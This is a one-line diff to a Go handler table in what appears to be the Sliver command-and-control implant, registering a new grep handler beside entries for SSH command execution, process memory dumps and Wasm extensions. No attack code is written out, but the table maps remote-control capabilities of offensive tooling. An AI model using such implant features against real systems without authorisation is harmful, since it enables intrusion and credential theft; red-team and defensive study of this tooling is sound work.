@@ -71,6 +71,7 @@ var (
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
 		sliverpb.MsgProcessDumpReq: dumpHandler,
+		sliverpb.MsgGrepReq:        grepHandler,
 
 		// Wasm Extensions - Note that execution can be done via a tunnel handler
 		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
